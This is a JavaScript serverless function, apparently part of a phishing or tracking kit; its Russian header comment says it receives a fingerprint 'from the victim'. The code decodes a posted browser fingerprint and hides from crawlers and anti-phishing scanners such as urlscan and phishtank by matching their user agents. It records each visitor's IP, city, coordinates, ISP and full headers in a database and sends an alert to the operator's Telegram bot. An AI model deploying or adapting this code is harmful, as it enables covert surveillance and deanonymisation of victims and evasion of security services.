// functions/api/fp.js — приём fingerprint от жертвы, запись в D1
export async function onRequestPost(context) {
  const { request, env } = context;

  const raw = await request.text();
  let fp = {};
  try {
    const decoded = decodeURIComponent(escape(atob(raw)));
    fp = JSON.parse(decoded);
  } catch (e) {}

  const cf = request.cf || {};
  const ua = request.headers.get("User-Agent") || "";

  if (/bot|crawler|spider|scanner|urlscan|phishtank|google|bing|yandex/i.test(ua)) {
    return new Response("ok");
  }

  const rec = {
    ts: new Date().toISOString(),
    ip: request.headers.get("CF-Connecting-IP") || "",
    country: request.headers.get("CF-IPCountry") || "",
    city: cf.city || "",
    region: cf.region || "",
    asn: cf.asn || "",
    org: cf.asOrganization || "",
    lat: cf.latitude || null,
    lon: cf.longitude || null,
    ua: ua,
    accept_lang: request.headers.get("Accept-Language") || "",
    fingerprint: JSON.stringify(fp),
    raw: JSON.stringify({ headers: Object.fromEntries(request.headers), cf, fp })
  };

  try {
    await env.DB.prepare(
      `INSERT INTO hits (ts,ip,country,city,region,asn,org,lat,lon,ua,accept_lang,fingerprint,raw)
       VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`
    ).bind(
      rec.ts, rec.ip, rec.country, rec.city, rec.region, rec.asn, rec.org,
      rec.lat, rec.lon, rec.ua, rec.accept_lang, rec.fingerprint, rec.raw
    ).run();
  } catch (e) {
    return new Response("db error: " + e.message, { status: 500 });
  }

  if (env.BOT_TOKEN && env.CHAT_ID) {
    const txt = `🔔 ${rec.ip} · ${rec.city}, ${rec.country}\n` +
                `📱 ${(fp.ua || "").slice(0, 80)}\n🌐 ${rec.org}`;
    try {
      await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: env.CHAT_ID, text: txt })
      });
    } catch (e) {}
  }

  return new Response("ok");
}
